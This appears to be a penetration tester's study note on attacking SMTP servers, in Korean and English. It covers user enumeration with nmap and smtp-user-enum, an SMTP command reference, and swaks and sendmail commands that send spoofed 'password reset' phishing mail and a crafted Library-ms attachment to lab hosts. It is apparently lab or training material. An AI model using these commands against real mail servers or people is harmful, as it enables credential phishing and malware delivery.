## Approach

1. 배너 그래빙 및 서비스 확인
    1. `nc` , `telnet` 등을 사용해 서버가 `postfix`, `sendmail`, 혹은 `Microsoft Exchange` 등 무엇인지 확인하고 해당 버전의 취약점이 있는지 확인
2. User Enumeration
3. Open Relay
4. Phishing 및 악성 코드 배포

## Tools

- username-anarchy
- cewl
- hydra
- smtp-user-enum
- nmap
- sendmail
- swaks

### Wordlist

- `/usr/share/seclists/usernames/names/names.txt`

## Enumeration

```bash
# Nmap
nmap $IP --script smtp-open-relay -p 25

# Username-anarchy
username-anarchy --input-file [file] > [output_file]

# modes: VRFY, EXPN, RCPT
# example wordlist: /usr/share/metasploit-framework/data/wordlists/unix_users.txt
smtp-user-enum -M [mode] -U [wordlist] -t $IP -p 25
smtp-user-enum -M VRFY -U ../footprinting-wordlist.txt -t 10.129.144.53 -p 25 -v -w 10

```

## Commands

| **Command** | **Description** |
| --- | --- |
| `AUTH PLAIN` | AUTH is a service extension used to authenticate the client. |
| `HELO` | The client logs in with its computer name and thus starts the session. |
| `MAIL FROM` | The client names the email sender. |
| `RCPT TO` | The client names the email recipient. |
| `DATA` | The client initiates the transmission of the email. |
| `RSET` | The client aborts the initiated transmission but keeps the connection between client and server. |
| `VRFY` | The client checks if a mailbox is available for message transfer. |
| `EXPN` | The client also checks if a mailbox is available for messaging with this command. |
| `NOOP` | The client requests a response from the server to prevent disconnection due to time-out. |
| `QUIT` | The client terminates the session. |

## Attack

Swaks

```bash
swaks -t brian.moore@postfish.off --from it@postfish.off --server 192.168.214.137 --body "click http://192.168.214.137 to reset your password" --header "Subject: password reset"
```

```bash
# prep the config.Library-ms and body.txt in advance
sudo swaks -t <target email> --from <legit email> --attach @config.Library-ms --server <target ip> --body @body.txt --header <anything you want> --suppress-data -ap
```

Sendmail

```bash
sendmail -t brian.moore@postfish.off -f it@postfish.off -s postfish.off --body "click http://192.168.214.137 to reset your password" --header "Subject: password reset"
```